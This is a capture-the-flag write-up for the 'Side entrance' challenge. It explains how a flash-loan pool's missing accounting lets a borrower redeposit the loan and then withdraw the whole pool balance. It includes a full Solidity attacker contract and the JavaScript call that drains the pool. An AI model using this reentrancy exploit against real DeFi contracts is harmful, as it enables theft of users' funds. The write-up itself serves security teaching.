# Challenge 4 — Side entrance

## Description

The `SideEntranceLenderPool` pool is extremely simple because it allows any user to deposit ETH and withdraw it at any time.

To receive a flash loan, the loanee contract must implement the `execute` function and make it payable in such a way as to satisfy the following call from the pool:
```solidity
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

At the end of the `flashLoan` function, there is a last test to pass to ensure that the amount on the contract has not decreased to make sure that the flash loan has been reimbursed.

## Vulnerability

In the `flashLoan` function, the accounting system using the `balances` mapping is completely ignored. It is therefore possible to call the `deposit` function of the `SideEntranceLenderPool` pool inside the `execute` callback function, which will be called in the middle of `flashLoan`.

In this way, the tokens borrowed by the borrower are immediately transferred back to the pool `SideEntranceLenderPool`. This allows:

- Reimburse the loan directly and therefore pass the last test of the `flashLoan` function which consists of checking that the amount on the contract has not decreased after the flash loan.
- To increment the `balances` mapping for the address of the attacker by the value of the balance pool.

Eventually, using the `withdraw` function, the attacker will be able to withdraw all tokens.

## How to exploit?

1. Create a `SideEntranceAttacker` contract with the `attack` function where the following workflow is implemented:

	- Execute the flash loan: `_pool.flashLoan(_poolBalance)`.
	- Withdraw the tokens from the pool: `_pool.withdraw()`.
	- Transfer the obtained tokens to the attacker EOA: `_attackerEOA.transfer(_poolBalance)`.

	```solidity
	contract SideEntranceAttacker {
	    using SafeMath for uint256;

	    ISideEntranceLenderPool _pool;
	    uint256 _poolBalance;
	    address payable _attackerEOA;

	    constructor() public {}

	    function attack(ISideEntranceLenderPool pool, address payable attackerEOA)
	        public
	    {
	        _pool = pool;
	        _attackerEOA = attackerEOA;
	        _poolBalance = address(_pool).balance;

	        // calls execute, then checks pool balance
	        _pool.flashLoan(_poolBalance);

	        _pool.withdraw();
	        _attackerEOA.transfer(_poolBalance);
	    }

	    // called by ISideEntranceLenderPool::flashLoan
	    function execute() external payable {
	        // deposit the tokens again, crediting the attacker contract
	        // and passing the flash loan balance check
	        _pool.deposit{value: _poolBalance}();
	    }

	    // needed for pool.withdraw() to work
	    receive() external payable {}
	}
	```

2. Call the `attack` function:
	```javascript
	await this.attacker.attack(this.pool.address, attacker);
	```

